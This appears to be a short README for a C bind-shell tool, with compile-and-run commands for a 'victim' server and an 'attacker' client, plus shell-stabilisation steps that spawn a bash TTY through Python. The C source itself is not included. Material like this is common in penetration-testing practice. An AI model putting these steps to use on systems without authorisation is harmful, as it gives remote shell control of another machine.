### Bind Shell in C.

This is a basic Server/Client scheme that trigger a shell on a Unix-based server and allows to the client to interact with the shell.

### Usage.

- **Victim machine**: Execute Server.c.

```C
gcc -o server Server.c; ./server
```

- **Attacker machine**: Execute Client.c.

```C
gcc -o client Client.c; ./client
```

Ensure to stabilize the shell after execute *client* program, this stuff is pretty basic:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```